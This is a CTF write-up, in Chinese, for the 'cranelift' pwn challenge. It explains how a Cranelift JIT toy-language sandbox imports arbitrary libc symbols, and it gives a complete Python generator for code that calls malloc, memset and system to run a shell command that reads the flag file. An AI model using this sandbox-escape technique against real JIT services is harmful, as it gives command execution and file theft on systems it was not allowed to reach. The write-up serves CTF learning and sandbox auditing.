# cranelift

## 题目简述

题目把 [Cranelift JIT Demo 的固定提交 `e435835`](https://github.com/bytecodealliance/cranelift-jit-demo/tree/e435835efbd7636bca230a3434d1d586587b378b) 改造成在线沙箱：选手提交一段玩具语言源码，以 `__EOF__` 结束输入，服务将源码写入临时文件，再交给 `toy` 编译并立即执行。容器中的 flag 位于名称随机化后的 `/flag-*.txt`。

决定性问题不在 Cranelift 的机器码生成，而在玩具语言对外部函数调用的处理。上游实现会把源码中的任意函数名声明为 `Linkage::Import`；JIT 后端随后从当前进程的符号空间解析该名称。上游示例本来用这一能力调用 `puts`，题目却没有为可调用的 libc 符号设置白名单，于是提交代码能够直接调用 `malloc`、`memset` 和 `system`。这是一道 JIT 沙箱逃逸题，按执行边界归入 `pwn`。

关键转换逻辑可以概括为：

```rust
fn translate_call(&mut self, name: String, args: Vec<Expr>) -> Value {
    let mut sig = self.module.make_signature();
    for _ in &args {
        sig.params.push(AbiParam::new(self.int));
    }
    sig.returns.push(AbiParam::new(self.int));

    let callee = self
        .module
        .declare_function(&name, Linkage::Import, &sig)
        .expect("problem declaring function");
    let local = self.module.declare_func_in_func(callee, self.builder.func);
    let argv = args.into_iter()
        .map(|arg| self.translate_expr(arg))
        .collect::<Vec<_>>();
    let call = self.builder.ins().call(local, &argv);
    self.builder.inst_results(call)[0]
}
```

## 解题过程

### 关键观察

玩具语言没有字符串字面量，但变量是机器字长整数，既能保存 `malloc` 返回的指针，也能做 `x + i` 形式的地址运算。`memset(ptr, byte, 1)` 可以逐字节构造命令字符串，末尾再写入 `\0`；完成后将指针传给 `system` 即可执行命令。

官方解法选择 `/bin/cat /flag*.txt`，通配符可以适配 Dockerfile 根据内容哈希重命名后的 flag 文件。下面的完整生成器输出需要提交的玩具语言代码：

```python
cmd = "/bin/cat /flag*.txt"

code = "fn pwn() -> (_) {\n"
code += "  x = malloc(100)\n"
for i, ch in enumerate(cmd):
    code += f"  memset(x+{i}, {ord(ch)}, 1)\n"
code += f"  memset(x+{len(cmd)}, 0, 1)\n"
code += "  system(x)\n"
code += "}"

print(code)
```

将输出发送给服务，再单独发送 `__EOF__`。执行链为：

1. `malloc(100)` 在进程内分配可写缓冲区；
2. 多次 `memset` 写出 `/bin/cat /flag*.txt\0`；
3. JIT 将 `system` 解析到 libc 中的同名符号；
4. shell 展开 `/flag*.txt` 并输出文件内容。

仓库中的官方 `solution/solve.py` 使用的正是这条链，`task.yml` 给出的验证结果为：

```text
CakeCTF{why_d0_th3y_4ll0w_l1bc_c4ll}
```

## 方法总结

- 核心技巧：利用 JIT 前端不受限的外部符号导入，把本应只用于演示的 libc 调用能力变成直接的命令执行原语。
- 识别信号：题目允许提交 JIT 源码，AST 支持任意名称的函数调用，调用转换使用 `Linkage::Import`，而宿主没有显式符号白名单。
- 复用要点：审计 JIT 沙箱不能只检查语言语法；还要追踪未定义函数如何链接、符号从哪里解析，以及整数是否可以充当指针。缺少字符串类型时，可以用分配函数和逐字节写入函数构造以 NUL 结尾的参数。
